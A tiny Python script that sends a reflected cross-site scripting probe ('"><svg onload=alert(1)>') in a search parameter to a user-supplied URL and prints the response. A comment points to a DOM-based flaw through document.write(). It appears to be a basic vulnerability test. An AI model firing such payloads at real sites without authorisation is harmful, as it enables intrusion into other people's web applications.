import requests

url = input("url : ")
r  = requests.get(url, params={'search':'"><svg onload=alert(1)>'})

print(r.text)
# dom based vulnerability affected to document write()